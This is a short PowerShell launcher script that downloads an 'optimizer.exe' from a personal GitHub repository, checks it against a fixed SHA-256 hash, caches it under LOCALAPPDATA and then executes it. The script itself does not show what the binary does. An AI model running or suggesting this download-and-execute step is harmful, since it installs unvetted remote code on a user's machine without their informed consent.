# PowerShell, optimizer.ps1, Windows 10/11
$ErrorActionPreference = 'Stop'
$uri = 'https://raw.githubusercontent.com/maximokx1-debug/optimizer-launcher/main/optimizer.exe'
$expectedSha256 = '2750459C5F5592D469B4325DADAB657E133FF4BCC784EAECD5AE21CF81C927C1'
$cacheDir = Join-Path $env:LOCALAPPDATA 'OptimizerLauncher'
$exePath = Join-Path $cacheDir 'optimizer.exe'

New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
$validCache = (Test-Path -LiteralPath $exePath) -and
    ((Get-FileHash -Algorithm SHA256 -LiteralPath $exePath).Hash -eq $expectedSha256)

if (-not $validCache) {
    $tempPath = Join-Path $cacheDir ([guid]::NewGuid().ToString('N') + '.download')
    try {
        Invoke-WebRequest -Uri $uri -OutFile $tempPath
        if ((Get-FileHash -Algorithm SHA256 -LiteralPath $tempPath).Hash -ne $expectedSha256) {
            throw 'SHA-256 скачанного optimizer.exe не совпадает с исходным файлом.'
        }
        Move-Item -LiteralPath $tempPath -Destination $exePath -Force
    }
    finally {
        Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue
    }
}

Start-Process -FilePath $exePath
